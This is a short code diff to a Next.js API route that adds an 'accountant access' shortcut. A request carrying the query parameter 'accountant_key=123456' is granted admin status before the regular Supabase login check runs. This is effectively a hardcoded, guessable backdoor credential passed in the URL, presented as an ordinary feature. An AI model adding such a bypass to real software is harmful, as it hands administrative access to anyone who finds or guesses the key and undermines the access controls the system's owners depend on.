@@ -30,6 +30,12 @@ export async function GET(req: NextRequest) {
         }
     }
 
+    // Allow accountant access with token
+    if (!isAdmin) {
+        const accountantKey = req.nextUrl.searchParams.get('accountant_key')
+        if (accountantKey === '123456') isAdmin = true
+    }
+
     if (!isAdmin) {
         const supabase = await createClient()
         const { data: { user } } = await supabase.auth.getUser()
